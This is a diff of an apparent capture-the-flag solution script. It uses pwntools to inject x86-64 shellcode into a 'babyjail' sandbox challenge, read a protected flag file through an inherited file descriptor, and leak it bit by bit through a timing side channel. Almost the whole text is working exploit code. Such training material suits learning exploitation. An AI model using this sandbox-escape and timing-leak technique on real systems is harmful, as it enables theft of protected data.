@@ -1,72 +1,57 @@
-assembly = """ ; Fundamentally similar to level 11
-xor rax, rax
-push 3  ; Syscall number for 'open'
-pop rdi
-lea rsi, [rip + flag_content]
-push 60 ; Number of bytes to read
-pop rdx
-syscall ; Read the content of the flag file into memory
+from pwn import *
+import os
+import time
 
-xor rbx, rbx
-mov bl, byte ptr[rip + flag_content + {}]  ; Get the byte at the specified index
-cmp bl, {} ; Compare to the byte value
-je loop_start ; If equal, go to loop_start
-jmp do_nop ; Otherwise, go to do_nop
+context.arch = 'amd64'
+context.encoding ='latin'
+context.log_level = 'INFO'
+warnings.simplefilter('ignore')
 
-loop_start: ; Loop to delay execution
-mov rcx, 3500000000 ; Initialize a counter for the loop
-loop_flag: 
-cmp rcx, 0  ; Check if the counter is 0
-je do_nop ; If yes, go to 'do_nop'
-dec rcx ; Decrement the counter
-jmp loop_flag ; Repeat the loop
+iter_progress = log.progress("PROGRESS")
+flag_prog = log.progress("FLAG")
+flag = ""
 
-do_nop:
-nop
+for i in range(0, 55):
+    biny = ''
+    for pwr in range (6, -1, -1): 
+        iter_progress.status(f"ITERATION {i}, BIT {pwr}")
 
-flag_content:
-.rept 60 
-.byte 0 
-.endr
-"""
+        assembly = asm(f""" 
+        xor rax, rax
+        mov rdi, 3
+        mov rsi, rsp
+        mov rdx, 55 
+        syscall
 
-print(assembly)
+        mov rdi, 0
+        mov dil, byte ptr [rsp+{i}]
+        
+        mov r8, {pow(2, pwr)}
 
-def do_run(i, b):
-    # Launch a process with the binary file and the flag file as arguments
-    with pwn.process(argv=['/challenge/babyjail_level12', '/flag'], close_fds=False) as p:
-        t1 = time.time() # Measure the execution time first time
-        # Send the assembly code to the process
-        p.send(pwn.asm(assembly.format(i, b)))
-        # Wait for the process to finish
-        p.poll(True)
+        mov r9, rdi
+        and r9, r8
+        cmp r9, r8 
+        jne fail
 
-    t2 = time.time() # Measure the execution time second time
-    # Calculate the time interval to measure the execution duration
-    interval = t2 - t1
-    print(f'TIME INTERVAL: {interval}, index: {i}, byte: {b}')
-    print(flag)
-    # If the interval is greater than 0.8, it means the byte is correct
-    if interval > 0.8:
-        return True
-    return False
+        loop:
+        jmp loop
 
-flag = ''
-# Loop to find each byte of the flag up to a length of 55
-for i in range(len(flag), 55):
-    for b in range(0x20, 0x7f):
-        try:
-            # Attempt to find the correct byte
-            if do_run(i, b):
-                print(f'flag[{i}] is {b}')
-                flag += chr(b)
-                print(flag)
-                break
-        except:
-            # In case of exception, retry after a short pause
-            print('Got exception')
-            time.sleep(1)
-            if do_run(i, b):
-                flag += chr(b)
-                print(flag) 
-                break
+        fail:
+        """)
+        start_time = time.time()
+        with process(["/challenge/babyjail_level12", "/flag"], level='CRITICAL', alarm=3) as p:
+            # info(p.readrepeat(1))
+            p.send(assembly)
+            # info(p.readrepeat(1))
+            # info(f"exit: {p.poll(True)}")
+            # flag = flag + chr(p.poll(True))
+            p.poll(True)
+        if time.time()-start_time > 2: 
+            biny += f"1"
+        else:
+            biny += f"0"
+
+    flag += chr(int(biny, 2))
+    flag_prog.status(repr(flag))
+
+print(flag)
